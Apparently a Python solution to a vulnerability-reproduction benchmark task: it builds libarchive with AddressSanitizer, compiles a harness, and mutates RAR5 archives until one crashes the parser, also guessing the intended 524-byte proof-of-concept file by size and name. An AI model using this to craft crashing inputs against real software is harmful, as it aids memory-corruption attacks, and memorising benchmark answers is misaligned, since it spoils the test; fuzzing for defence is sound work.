import os
import re
import io
import sys
import tarfile
import time
import tempfile
import shutil
import subprocess
from pathlib import Path
from typing import List, Optional, Tuple


RAR5_SIG = b"Rar!\x1a\x07\x01\x00"


def _safe_extract_tar(tar_path: str, dst_dir: str) -> str:
    dst = Path(dst_dir)
    dst.mkdir(parents=True, exist_ok=True)

    with tarfile.open(tar_path, "r:*") as tf:
        members = tf.getmembers()

        # Detect common leading directory
        top_levels = set()
        for m in members:
            p = Path(m.name)
            if p.parts:
                top_levels.add(p.parts[0])
        # Safe extraction
        for m in members:
            if not m.name or m.name.startswith("/") or ".." in Path(m.name).parts:
                continue
            # Skip device files
            if m.isdev():
                continue
            out_path = dst / m.name
            out_path_parent = out_path.parent
            out_path_parent.mkdir(parents=True, exist_ok=True)
            try:
                tf.extract(m, path=dst_dir, set_attrs=False)
            except Exception:
                # Try streaming extraction as fallback
                try:
                    if m.isfile():
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        out_path_parent.mkdir(parents=True, exist_ok=True)
                        with open(out_path, "wb") as wf:
                            wf.write(data)
                except Exception:
                    continue

    # If there is a single top-level directory, return it as project root
    if len(top_levels) == 1:
        root = dst / next(iter(top_levels))
        if root.is_dir():
            return str(root)
    return str(dst)


def _read_small_file(p: Path, limit: int = 4 * 1024 * 1024) -> Optional[bytes]:
    try:
        st = p.stat()
        if st.st_size <= 0 or st.st_size > limit:
            return None
        with open(p, "rb") as f:
            return f.read()
    except Exception:
        return None


def _iter_files(root: str) -> List[Path]:
    r = Path(root)
    out = []
    for dp, dn, fn in os.walk(r, followlinks=False):
        for name in fn:
            out.append(Path(dp) / name)
    return out


def _find_rar5_files(root: str, max_size: int = 2 * 1024 * 1024) -> List[Tuple[Path, int]]:
    res = []
    for p in _iter_files(root):
        try:
            st = p.stat()
            if st.st_size <= 0 or st.st_size > max_size:
                continue
            with open(p, "rb") as f:
                head = f.read(len(RAR5_SIG))
            if head == RAR5_SIG:
                res.append((p, st.st_size))
        except Exception:
            continue
    res.sort(key=lambda x: x[1])
    return res


def _vint_read(buf: bytes, pos: int) -> Tuple[int, int]:
    v = 0
    shift = 0
    while True:
        if pos >= len(buf):
            return v, pos
        b = buf[pos]
        pos += 1
        v |= (b & 0x7F) << shift
        if (b & 0x80) == 0:
            break
        shift += 7
        if shift > 63:
            break
    return v, pos


def _parse_rar5_blocks(data: bytes, max_blocks: int = 4096) -> List[dict]:
    # Very small parser sufficient to locate blocks with data areas.
    if not data.startswith(RAR5_SIG):
        return []
    pos = len(RAR5_SIG)
    blocks = []
    for _ in range(max_blocks):
        if pos + 4 >= len(data):
            break
        crc_off = pos
        pos += 4
        head_size, pos2 = _vint_read(data, pos)
        if pos2 <= pos:
            break
        pos = pos2
        header_start = pos
        header_end = header_start + head_size
        if header_end > len(data):
            break
        hpos = header_start
        htype, hpos = _vint_read(data, hpos)
        hflags, hpos = _vint_read(data, hpos)
        extra_size = 0
        data_size = 0
        # Assumption (RAR5 spec): bit0 extra, bit1 data
        if hflags & 0x0001:
            extra_size, hpos = _vint_read(data, hpos)
        if hflags & 0x0002:
            data_size, hpos = _vint_read(data, hpos)

        data_start = header_end
        data_end = data_start + data_size
        if data_end > len(data):
            break

        blocks.append(
            {
                "crc_off": crc_off,
                "head_size_off": crc_off + 4,
                "header_start": header_start,
                "header_end": header_end,
                "type": htype,
                "flags": hflags,
                "extra_size": extra_size,
                "data_size": data_size,
                "data_start": data_start,
                "data_end": data_end,
            }
        )
        pos = data_end
        # End of archive block type is usually 5, but we don't rely on it.
        if pos >= len(data):
            break
    return blocks


def _which(prog: str) -> Optional[str]:
    return shutil.which(prog)


def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 120) -> Tuple[int, bytes, bytes]:
    try:
        p = subprocess.run(
            cmd,
            cwd=cwd,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            check=False,
        )
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired as e:
        return 124, b"", (e.stdout or b"") + (e.stderr or b"")
    except Exception as e:
        return 127, b"", str(e).encode("utf-8", "ignore")


def _build_runner(project_root: str, workdir: str, time_budget_s: int = 120) -> Optional[str]:
    start = time.time()
    root = Path(project_root)
    if not (root / "CMakeLists.txt").is_file():
        return None
    cmake = _which("cmake")
    if not cmake:
        return None

    ninja = _which("ninja")
    generator = ["-G", "Ninja"] if ninja else []

    cc = _which("clang") or _which("gcc") or _which("cc")
    if not cc:
        return None

    build_dir = Path(workdir) / "build"
    build_dir.mkdir(parents=True, exist_ok=True)

    cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
    ldflags = "-fsanitize=address"

    # Try to disable optional deps to reduce build failures/time.
    cmake_args = [
        cmake,
        "-S",
        str(root),
        "-B",
        str(build_dir),
        *generator,
        f"-DCMAKE_C_COMPILER={cc}",
        "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
        "-DBUILD_SHARED_LIBS=ON",
        "-DBUILD_TESTING=OFF",
        "-DENABLE_TESTING=OFF",
        "-DENABLE_TEST=OFF",
        "-DENABLE_OPENSSL=OFF",
        "-DENABLE_NETTLE=OFF",
        "-DENABLE_LIBB2=OFF",
        "-DENABLE_LIBXML2=OFF",
        "-DENABLE_EXPAT=OFF",
        "-DENABLE_ICONV=OFF",
        "-DENABLE_LZMA=OFF",
        "-DENABLE_ZSTD=OFF",
        "-DENABLE_BZip2=OFF",
        "-DENABLE_BZIP2=OFF",
        "-DENABLE_CNG=OFF",
        f"-DCMAKE_C_FLAGS={cflags}",
        f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
        f"-DCMAKE_SHARED_LINKER_FLAGS={ldflags}",
    ]

    rc, out, err = _run(cmake_args, cwd=str(root), timeout=max(10, min(120, time_budget_s)))
    if rc != 0:
        # Retry with fewer options
        cmake_args2 = [
            cmake,
            "-S",
            str(root),
            "-B",
            str(build_dir),
            *generator,
            f"-DCMAKE_C_COMPILER={cc}",
            "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
            "-DBUILD_SHARED_LIBS=ON",
            "-DBUILD_TESTING=OFF",
            f"-DCMAKE_C_FLAGS={cflags}",
            f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
            f"-DCMAKE_SHARED_LINKER_FLAGS={ldflags}",
        ]
        rc, out, err = _run(cmake_args2, cwd=str(root), timeout=max(10, min(120, time_budget_s)))
        if rc != 0:
            return None

    remaining = int(max(15, time_budget_s - (time.time() - start)))
    build_cmd = [cmake, "--build", str(build_dir), "--parallel", str(max(1, (os.cpu_count() or 2)))]
    rc, out, err = _run(build_cmd, cwd=str(root), timeout=remaining)
    if rc != 0:
        return None

    # Find libarchive shared library
    lib = None
    for p in build_dir.rglob("libarchive.so"):
        lib = p
        break
    if lib is None:
        for p in build_dir.rglob("libarchive.so.*"):
            lib = p
            break
    if lib is None:
        return None

    # Build runner
    runner_c = r"""
#include <archive.h>
#include <archive_entry.h>
#include <stdint.h>
#include <stdio.h>

int main(int argc, char **argv) {
    if (argc < 2) return 10;
    struct archive *a = archive_read_new();
    if (!a) return 10;
    archive_read_support_filter_all(a);
    archive_read_support_format_all(a);

    int r = archive_read_open_filename(a, argv[1], 10240);
    if (r != ARCHIVE_OK) {
        archive_read_free(a);
        return 10;
    }
    struct archive_entry *entry = NULL;
    int saw = 0;
    while ((r = archive_read_next_header(a, &entry)) == ARCHIVE_OK) {
        saw = 1;
        const void *buff;
        size_t size;
        la_int64_t offset;
        for (;;) {
            r = archive_read_data_block(a, &buff, &size, &offset);
            if (r == ARCHIVE_EOF) break;
            if (r != ARCHIVE_OK) break;
        }
    }
    archive_read_free(a);
    return saw ? 0 : 11;
}
"""
    runner_c_path = build_dir / "runner.c"
    runner_path = build_dir / "runner"
    try:
        runner_c_path.write_text(runner_c, encoding="utf-8")
    except Exception:
        return None

    inc1 = root / "libarchive"
    inc2 = build_dir / "libarchive"
    cc_cmd = [
        cc,
        "-O1",
        "-g",
        "-fno-omit-frame-pointer",
        "-fsanitize=address",
        str(runner_c_path),
        str(lib),
        "-I",
        str(inc1),
        "-I",
        str(inc2),
        "-Wl,-rpath," + str(lib.parent),
        "-o",
        str(runner_path),
    ]
    rc, out, err = _run(cc_cmd, cwd=str(build_dir), timeout=max(10, int(time_budget_s - (time.time() - start))))
    if rc != 0 or not runner_path.is_file():
        return None
    return str(runner_path)


def _is_sanitizer_crash(rc: int, stderr: bytes) -> bool:
    if rc < 0:
        return True
    s = stderr.decode("utf-8", "ignore")
    key = [
        "AddressSanitizer",
        "ERROR: ASan",
        "stack-buffer-overflow",
        "heap-buffer-overflow",
        "undefined-behavior",
        "runtime error:",
        "SEGV",
        "SIGSEGV",
        "Sanitizer",
    ]
    return any(k in s for k in key)


def _run_runner(runner: str, data: bytes, workdir: str, timeout: float = 2.0) -> Tuple[bool, int, bytes, bytes]:
    p = Path(workdir) / "in.rar"
    try:
        p.write_bytes(data)
    except Exception:
        return False, 127, b"", b"write_failed"
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "") + ":abort_on_error=1:halt_on_error=1"
    rc, out, err = _run([runner, str(p)], cwd=str(Path(runner).parent), env=env, timeout=int(max(1, timeout)))
    crash = _is_sanitizer_crash(rc, err)
    return crash, rc, out, err


def _minimize_prefix(runner: str, data: bytes, workdir: str, max_iters: int = 32) -> bytes:
    lo = 0
    hi = len(data)
    # Ensure it crashes
    crash, _, _, _ = _run_runner(runner, data, workdir, timeout=2.0)
    if not crash:
        return data
    # Binary search shortest crashing prefix
    it = 0
    while lo + 1 < hi and it < max_iters:
        it += 1
        mid = (lo + hi) // 2
        crash, _, _, _ = _run_runner(runner, data[:mid], workdir, timeout=2.0)
        if crash:
            hi = mid
        else:
            lo = mid
    return data[:hi]


def _try_mutations(runner: str, base: bytes, workdir: str, blocks: List[dict], time_limit_s: float = 30.0) -> Optional[bytes]:
    start = time.time()

    data_blocks = [b for b in blocks if b.get("data_size", 0) > 0 and b.get("data_end", 0) <= len(base)]
    if not data_blocks:
        return None

    offsets = [0, 1, 2, 3, 4, 8, 16, 32]
    patch_lens = [32, 64, 128, 256, 384, 512, 768]
    patterns = [
        b"\xff",
        b"\x00",
        b"\xff\x00",
        b"\x00\xff",
        b"\xff\xff\x00\x00",
        b"\x00\x00\xff\xff",
        bytes(range(256)),
        b"\x55",
        b"\xaa",
        b"\x0f",
        b"\xf0",
        b"\x7f",
        b"\x80",
    ]

    def apply_patch(orig: bytes, blk: dict, off: int, pat: bytes, plen: int) -> bytes:
        ds = blk["data_start"]
        de = blk["data_end"]
        size = de - ds
        if off < 0 or off >= size:
            return orig
        n = min(plen, size - off)
        if n <= 0:
            return orig
        out = bytearray(orig)
        for i in range(n):
            out[ds + off + i] = pat[i % len(pat)]
        return bytes(out)

    # Deterministic grid search
    for blk in data_blocks[:4]:
        for off in offsets:
            for plen in patch_lens:
                for pat in patterns:
                    if time.time() - start > time_limit_s:
                        return None
                    cand = apply_patch(base, blk, off, pat, plen)
                    crash, rc, out, err = _run_runner(runner, cand, workdir, timeout=2.0)
                    if crash:
                        return cand

    # Random-ish mutations near start of data block(s)
    seed = 0xC0FFEE
    def rnd_u32():
        nonlocal seed
        seed = (seed * 1664525 + 1013904223) & 0xFFFFFFFF
        return seed

    for blk in data_blocks[:2]:
        ds = blk["data_start"]
        de = blk["data_end"]
        size = de - ds
        if size <= 0:
            continue
        for _ in range(2000):
            if time.time() - start > time_limit_s:
                return None
            out = bytearray(base)
            # Mutate first window
            win = min(256, size)
            nchanges = 1 + (rnd_u32() % 16)
            for _c in range(nchanges):
                idx = ds + (rnd_u32() % win)
                out[idx] = rnd_u32() & 0xFF
            # Often fill a run with 0xFF to maximize counts
            if (rnd_u32() & 7) == 0:
                run_off = rnd_u32() % min(64, win)
                run_len = 16 + (rnd_u32() % min(256, win - run_off))
                for i in range(run_len):
                    out[ds + run_off + i] = 0xFF
            cand = bytes(out)
            crash, rc, o, e = _run_runner(runner, cand, workdir, timeout=2.0)
            if crash:
                return cand

    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp = tempfile.mkdtemp(prefix="poc_rar5_")
        work = tempfile.mkdtemp(prefix="poc_rar5_work_")
        try:
            if os.path.isdir(src_path):
                project_root = src_path
            else:
                project_root = _safe_extract_tar(src_path, tmp)

            rar5_files = _find_rar5_files(project_root, max_size=4 * 1024 * 1024)

            # If a 524-byte RAR5 file exists, it's likely the intended PoC
            for p, sz in rar5_files:
                if sz == 524:
                    b = _read_small_file(p, limit=4 * 1024 * 1024)
                    if b is not None:
                        return b

            # If any file name strongly suggests a crash/poc, prefer it
            for p, sz in rar5_files[:50]:
                name = str(p).lower()
                if any(k in name for k in ("poc", "crash", "overflow", "asan", "stack", "rar5")) and sz <= 64 * 1024:
                    b = _read_small_file(p, limit=4 * 1024 * 1024)
                    if b is not None and b.startswith(RAR5_SIG):
                        # Might already be a PoC
                        return b

            # Build runner and try to find an actual crashing mutation
            runner = _build_runner(project_root, work, time_budget_s=140)
            if runner and rar5_files:
                # Select a base sample that opens and reaches at least one header (runner returns 0)
                base_bytes = None
                for p, sz in rar5_files[:25]:
                    b = _read_small_file(p, limit=4 * 1024 * 1024)
                    if b is None:
                        continue
                    crash, rc, out, err = _run_runner(runner, b, work, timeout=2.0)
                    if crash:
                        # Already crashing input found in tree
                        minimized = _minimize_prefix(runner, b, work)
                        return minimized
                    if rc == 0:
                        base_bytes = b
                        break

                if base_bytes is None:
                    # Fall back to smallest rar5 file
                    base_bytes = _read_small_file(rar5_files[0][0], limit=4 * 1024 * 1024)

                if base_bytes is not None:
                    blocks = _parse_rar5_blocks(base_bytes)
                    cand = _try_mutations(runner, base_bytes, work, blocks, time_limit_s=35.0)
                    if cand is not None:
                        minimized = _minimize_prefix(runner, cand, work)
                        return minimized

                    # Last-ditch: aggressive overwrite of first data block
                    data_blocks = [b for b in blocks if b.get("data_size", 0) > 0]
                    if data_blocks:
                        blk = data_blocks[0]
                        out = bytearray(base_bytes)
                        ds = blk["data_start"]
                        de = blk["data_end"]
                        n = min(1024, de - ds)
                        if n > 0:
                            out[ds:ds + n] = b"\xff" * n
                            cand = bytes(out)
                            crash, rc, o, e = _run_runner(runner, cand, work, timeout=2.0)
                            if crash:
                                minimized = _minimize_prefix(runner, cand, work)
                                return minimized

            # If we cannot build or find crash, return the smallest RAR5 file (best-effort)
            if rar5_files:
                b = _read_small_file(rar5_files[0][0], limit=4 * 1024 * 1024)
                if b is not None:
                    # Heuristic mutation to attempt triggering the issue without executing
                    blocks = _parse_rar5_blocks(b)
                    data_blocks = [blk for blk in blocks if blk.get("data_size", 0) > 0]
                    if data_blocks:
                        blk = data_blocks[0]
                        out = bytearray(b)
                        ds = blk["data_start"]
                        de = blk["data_end"]
                        n = min(768, de - ds)
                        if n > 0:
                            out[ds:ds + n] = b"\xff" * n
                            return bytes(out)
                    return b

            # Absolute fallback: minimal signature with padding
            return RAR5_SIG + (b"\x00" * (524 - len(RAR5_SIG)))
        finally:
            try:
                shutil.rmtree(tmp, ignore_errors=True)
            except Exception:
                pass
            try:
                shutil.rmtree(work, ignore_errors=True)
            except Exception:
                pass